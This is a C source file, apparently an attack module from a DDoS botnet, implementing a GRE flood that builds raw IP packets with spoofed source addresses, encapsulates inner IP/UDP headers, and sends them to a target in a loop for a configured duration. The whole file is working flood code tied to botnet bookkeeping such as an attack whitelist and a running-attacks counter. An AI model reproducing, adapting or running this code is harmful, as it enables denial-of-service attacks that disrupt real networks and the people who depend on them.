#include "../includes/methods/gre.h"

void greIP(int idx, struct target *_config)
{
    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1)
    {
        DBG_ERR();
        return;
    }

    int opt = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt)) == -1)
    {
        DBG_ERR();
        close(fd);
        return;
    }

    struct target config = *(_config);

    size_t randDataLen = (rand() % 512) + 1, dataLen = 0;
    size_t pktLen = (sizeof(struct iphdr) * 2) + sizeof(struct udphdr) + sizeof(struct grehdr) + dataLen;
    uint8_t *pkt = (uint8_t *)calloc(pktLen, sizeof(uint8_t));

    struct iphdr *iph = (struct iphdr *)pkt;
    struct grehdr *greh = (struct grehdr *)(iph + 1);
    struct iphdr *greiph = (struct iphdr *)(greh + 1);
    struct udphdr *udph = (struct udphdr *)(greiph + 1);

    uint8_t tos = getFlagInt(config, FLAG_TOS, 0);
    uint16_t id = getFlagInt(config, FLAG_ID, rand16());
    uint8_t ttl = getFlagInt(config, FLAG_TTL, 64);
    bool noFrag = getFlagInt(config, FLAG_FRAG, false);
    in_addr_t s = getSpoofHost(config, localAddress);

    iph->version = 4;
    iph->ihl = 5;
    iph->tos = tos;
    iph->tot_len = htons(pktLen);
    iph->id = htons(id);
    iph->ttl = ttl;

    if (noFrag)
        iph->frag_off = DONT_FRAG;

    iph->protocol = IPPROTO_GRE;
    iph->saddr = s;
    iph->daddr = config.addr.sin_addr.s_addr;

    greh->protocol = htons(ETH_P_IP);

    greiph->version = 4;
    greiph->ihl = 5;
    greiph->tos = tos;
    greiph->tot_len = htons(pktLen - (sizeof(struct iphdr) + sizeof(struct grehdr)));
    greiph->id = htons(~id);
    greiph->ttl = ttl;

    if (noFrag)
        greiph->frag_off = DONT_FRAG;

    greiph->protocol = IPPROTO_UDP;
    greiph->saddr = getSpoofHost(config, localAddress);

    if (getFlagInt(config, FLAG_GCIP, false))
        greiph->daddr = iph->daddr;
    else
        greiph->daddr = ~(greiph->saddr - 1024);

    udph->source = htons(getFlagInt(config, FLAG_SPORT, rand16()));
    udph->dest = htons(getFlagInt(config, FLAG_DPORT, rand16()));
    udph->len = htons(sizeof(struct udphdr) + dataLen);

    config.addr.sin_port = 0;

    size_t udpPlusData = sizeof(struct udphdr) + dataLen;
    uint16_t *ipChecksumAddr = (uint16_t *)iph;
    uint16_t *greChecksumAddr = (uint16_t *)greiph;
    struct sockaddr *targetAddr = (struct sockaddr *)&config.addr;
    time_t end = time(NULL) + config.duration;

    do {
        iph->check = 0;
        iph->check = checksumGeneric(ipChecksumAddr, sizeof(struct iphdr));

        greiph->check = 0;
        greiph->check = checksumGeneric(greChecksumAddr, sizeof(struct iphdr));

        udph->check = 0;
        udph->check = checksumTCPUDP(greiph, udph, udph->len, udpPlusData);

        sendto(fd, pkt, pktLen, MSG_NOSIGNAL, targetAddr, sizeof(config.addr));
    } while (time(NULL) < end);

    atkWhitelist[idx] = -1;
    runningAttacks--;

    close(fd);
    free(pkt);
    exit(0);
}
